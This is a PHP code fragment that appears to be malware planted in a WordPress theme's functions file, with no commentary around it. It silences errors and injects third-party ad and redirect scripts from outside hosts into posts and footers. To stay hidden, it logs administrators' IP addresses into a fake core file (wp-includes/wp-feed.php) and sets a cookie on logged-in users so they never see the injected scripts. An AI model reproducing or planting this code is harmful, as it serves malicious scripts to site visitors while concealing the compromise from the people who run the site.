ini_set('display_errors', 0);
error_reporting(0);
$anx='e810cc8873fd72ff6d1585ebccddae8e';
if ( ! function_exists( 'slider_option' ) ) {  


function slider_option($content){ 
if(is_single())
{




$con = '
';

$con2 = '

<script type="text/javascript" src="//go.oclaserver.com/apu.php?zoneid=1476266"></script>
<script src="//go.mobtrks.com/notice.php?p=1537586&interstitial=1"></script>
<script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=1476269&interactive=1&pushup=1"></script>

';

$content=$content.$con2;
}
return $content;
} 

function slider_option_footer(){ 
if(!is_single())
{




$con2 = '

<script type="text/javascript" src="//go.oclaserver.com/apu.php?zoneid=1476266"></script>
<script src="//go.mobtrks.com/notice.php?p=1537586&interstitial=1"></script>
<script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=1476269&interactive=1&pushup=1"></script>

';

echo $con2;
}
} 








function setting_my_first_cookie() {
  setcookie( 'wordpress_cf_adm_use_adm',1, time()+3600*24*1000, COOKIEPATH, COOKIE_DOMAIN);
  }


if(is_user_logged_in())
{
add_action( 'init', 'setting_my_first_cookie',1 );
}







if( current_user_can('edit_others_pages'))
{

if (file_exists(ABSPATH.'wp-includes/wp-feed.php'))
{
$ip=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
}

if (stripos($ip, $_SERVER['REMOTE_ADDR']) === false)
{
$ip.=$_SERVER['REMOTE_ADDR'].'
';
@file_put_contents(ABSPATH.'wp-includes/wp-feed.php',$ip);


}



}






$ref = $_SERVER['HTTP_REFERER'];
$SE = array('google.','/search?','images.google.', 'web.info.com', 'search.','yahoo.','yandex','msn.','baidu','bing.','doubleclick.net','googleweblight.com');
foreach ($SE as $source) {
  if (strpos($ref,$source)!==false) {
    setcookie("sevisitor", 1, time()+120, COOKIEPATH, COOKIE_DOMAIN); 
	$sevisitor=true;
  }
}






if(!isset($_COOKIE['wordpress_cf_adm_use_adm']) && !is_user_logged_in()) 
{
$adtxt=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
if (stripos($adtxt, $_SERVER['REMOTE_ADDR']) === false)
{
add_filter('the_content','slider_option');
add_action('wp_footer','slider_option_footer');
if($sevisitor==true || isset($_COOKIE['sevisitor']))
{

}

}

} 





}